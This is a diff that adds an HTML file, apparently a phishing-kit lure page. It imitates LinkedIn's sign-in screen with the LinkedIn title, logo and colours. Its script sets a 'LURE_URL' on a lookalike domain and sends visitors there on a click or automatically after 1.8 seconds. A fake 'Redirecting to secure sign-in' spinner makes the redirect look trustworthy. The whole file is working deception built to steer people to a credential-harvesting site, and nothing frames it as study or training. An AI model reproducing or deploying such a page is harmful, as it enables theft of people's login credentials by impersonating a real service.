@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LinkedIn: Log In or Sign Up</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
+    .card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px 36px 32px;width:100%;max-width:400px;text-align:center}
+    .logo{margin-bottom:24px;display:flex;align-items:center;justify-content:center}
+    .tagline{color:#666;font-size:15px;margin-bottom:28px;line-height:1.4}
+    .btn{display:block;width:100%;padding:12px;background:#0A66C2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:opacity .2s}
+    .btn:hover{opacity:.88}
+    .spinner{width:36px;height:36px;border:3px solid #eee;border-top:3px solid #0A66C2;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading{display:none}
+    .loading p{color:#888;font-size:14px;margin-top:8px}
+    footer{margin-top:24px;color:#999;font-size:12px}
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <div class="logo"><svg xmlns="http://www.w3.org/2000/svg" width="44" height="44" viewBox="0 0 72 72"><path fill="#0A66C2" d="M8 72h56a8 8 0 008-8V8a8 8 0 00-8-8H8a8 8 0 00-8 8v56a8 8 0 008 8z"/><path fill="#fff" d="M62 62H51.3V43.8c0-4.3-1.6-7.2-5.5-7.2-3 0-4.8 2-5.5 4-.3.7-.4 1.6-.4 2.5V62H29.1s.1-30.5 0-33.6h10.8v4.8c-.1.1-.2.2-.3.4h.3v-.4c1.4-2.2 4-5.4 9.6-5.4 7 0 12.2 4.6 12.2 14.4l.3 21.8zM17.7 24.7h-.1c-3.6 0-5.9-2.5-5.9-5.6 0-3.2 2.4-5.6 6-5.6s5.9 2.4 5.9 5.6c0 3.1-2.3 5.6-5.9 5.6zM12.4 62V28.4h10.7V62H12.4z"/></svg></div>
+    <p class="tagline">Welcome back. Connect to your professional network.</p>
+    <a class="btn" id="btn" href="#">Sign in</a>
+  </div>
+  <div class="card loading" id="loading">
+    <div class="spinner"></div>
+    <p>Redirecting to secure sign-in&hellip;</p>
+  </div>
+  <footer>Secure connection &bull; Privacy Policy</footer>
+  <script>
+    var LURE_URL = 'https://www.linkedin2026.authenticationsession.online/jCbaVYOf'; /* AUTO_LURE_URL */
+    document.getElementById('btn').href = LURE_URL;
+    document.getElementById('btn').addEventListener('click', function(e) {
+      e.preventDefault();
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    });
+    // Auto-redirect after 1.8s if user doesn't click
+    setTimeout(function(){
+      document.getElementById('card').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      setTimeout(function(){ window.location.href = LURE_URL; }, 600);
+    }, 1800);
+  </script>
+</body>
+</html>
